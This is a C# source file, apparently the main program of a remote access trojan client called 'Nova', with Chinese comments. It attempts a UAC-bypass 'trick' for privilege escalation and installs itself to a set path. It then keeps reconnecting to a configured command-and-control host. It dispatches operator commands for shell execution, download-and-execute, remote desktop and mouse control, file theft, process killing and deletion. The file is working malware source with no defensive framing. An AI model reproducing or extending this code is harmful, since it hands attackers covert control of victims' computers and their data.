using Nova;
using Nova.Commands;
using Nova.Packets;
using Nova.Packets.ClientPackets;
using Nova.Packets.ServerPackets;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
static class Program
{
    public static Client _client;
    static bool Connected = false;
    static Mutex AppMutex;
    [STAThread]
    static void Main()
    {
        Settings.Initialize();
        if (!Settings.ALLOWMULTIPLE && !ClientInfo.CreateMutex(ref AppMutex))
        {
           return;
        }
        //初始化客户端
        Initialize();
        if (!ClientInfo.Disconnect)
            Connect();
        CHandler.CloseShell();
        if (AppMutex != null)
            AppMutex.Close();
    }
    static void Initialize()
    {
        ClientInfo.OperatingSystem = ClientInfo.GetOperatingSystem();
        ClientInfo.MyPath = Application.ExecutablePath;
        ClientInfo.InstallPath = Path.Combine(Settings.DIR, Settings.SUBFOLDER + @"\" + Settings.INSTALLNAME);
        ClientInfo.AccountType = ClientInfo.GetAccountType();
        ClientInfo.InitializeGeoIp();
        ClientInfo.GetScreenWightHeigth();

        if (Settings.ENABLEUACESCALATION)
        {
            if (ClientInfo.TryUacTrick())
                ClientInfo.Disconnect = true;
            if (ClientInfo.Disconnect)
                return;
        }
        if (!Settings.INSTALL || ClientInfo.MyPath == ClientInfo.InstallPath)
        {
            //客户端
            _client = new Client(8192);
            _client.ClientState += ClientState;
            _client.ClientRead += ClientRead;

            _client.AddTypesToSerializer(typeof(IPacket), new Type[]
            {
                typeof(InitializeCommand),
                typeof(Disconnect),
                typeof(Reconnect),
                typeof(Uninstall),
                typeof(DownloadAndExecute),
                typeof(Desktop),
                typeof(GetProcesses),
                typeof(KillProcess),
                typeof(StartProcess),
                typeof(Drives),
                typeof(Folder),
                typeof(DownloadFile),
                typeof(MouseClick),
                typeof(GetSystemInfo),
                typeof(Update),
                typeof(Monitors),
                typeof(ShellCommand),
                typeof(Rename),
                typeof(Delete),
                typeof(PowerOptions),
                typeof(Initialize),
                typeof(Status),
                typeof(UserStatus),
                typeof(DesktopResponse),
                typeof(GetProcessesResponse),
                typeof(DrivesResponse),
                typeof(DirectoryResponse),
                typeof(DownloadFileResponse),
                typeof(GetSystemInfoResponse),
                typeof(MonitorsResponse),
                typeof(ShellCommandResponse)
            });
            _client.AddTypesToSerializer(typeof(IPacket), new Type[]
           {
                typeof(UnknownPacket),
                typeof(KeepAlive),
                typeof(KeepAliveResponse)
           });
        }
        else
        {
            ClientInfo.Install();
        }
    }
   
    //静态方法调用静态方法
    static void Connect()
    {
    Again:
        Thread.Sleep(250 + new Random().Next(0, 250));
        if (!Connected)
        {
            _client.Connect(Settings.HOST, Settings.PORT);
        }
        Thread.Sleep(200);
        Application.DoEvents();
    Hold:
        while (Connected)
        {
            Application.DoEvents();
            Thread.Sleep(2500);
        }
        Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
        if (ClientInfo.Disconnect)
        {
            _client.Disconnect();
            return;
        }
        if (!ClientInfo.Disconnect && !Connected)
            goto Again;
        else
            goto Hold;
    }
    static void ClientState(Client client, bool connected)
    {
        // 只有系统未主动断开时，一直允许自动重连
        Connected = connected;  
    }
    static void ClientRead(Client client, IPacket packet)
    {
        Type type = packet.GetType();
        if(type == typeof(KeepAlive))
        {
            CHandler.Execute(new KeepAliveResponse() { TimeSent = ((KeepAlive)packet).TimeSent }, client);
        }
        else if (type == typeof(InitializeCommand))
        {
            CHandler.HandleInitializeCommand((InitializeCommand)packet, client);
        }
        else if (type == typeof(GetProcesses))
        {
            CHandler.HandleGetProcesses((GetProcesses)packet, client);
        }
        else if (type == typeof(Drives))
        {
            CHandler.HandleDrives((Drives)packet, client);
        }
        else if (type == typeof(Folder))
        {
            CHandler.HandleDirectory((Folder)packet, client);
        }
        else if (type == typeof(ShellCommand))
        {
            CHandler.HandleShellCommand((ShellCommand)packet, client);
        }
        else if (type == typeof(GetSystemInfo))
        {
            CHandler.HandleGetSystemInfo((GetSystemInfo)packet, client);
        }
        else if (type == typeof(KillProcess))
        {
            CHandler.HandleKillProcess((KillProcess)packet, client);
        }
        else if (type == typeof(StartProcess))
        {
            CHandler.HandleStartProcess((StartProcess)packet, client);
        }
        else if (type == typeof(DownloadFile))
        {
            CHandler.HandleDownloadFile((DownloadFile)packet, client);
        }
        else if (type == typeof(Rename))
        {
            CHandler.HandleRename((Rename)packet, client);
        }
        else if (type == typeof(Delete))
        {
            CHandler.HandleDelete((Delete)packet, client);
        }
        else if (type == typeof(Nova.Packets.ServerPackets.PowerOptions))
        {
            CHandler.HandleAction((Nova.Packets.ServerPackets.PowerOptions)packet, client);
        }
        else if (type == typeof(Disconnect))
        {
            ClientInfo.Disconnect = true;
            client.Disconnect();
        }
        else if (type == typeof(Reconnect))
        {
            client.Disconnect();
        }
        else if (type == typeof(Uninstall))
        {
            CHandler.HandleUninstall((Uninstall)packet, client);
        }
        else if (type == typeof(Monitors))
        {
            CHandler.HandleMonitors((Monitors)packet, client);
        }
        else if (type == typeof(Desktop))
        {
            CHandler.HandleRemoteDesktop((Desktop)packet, client);
        }
        else if (type == typeof(MouseClick))
        {
            CHandler.HandleMouseClick((MouseClick)packet, client);
        }
    }
}

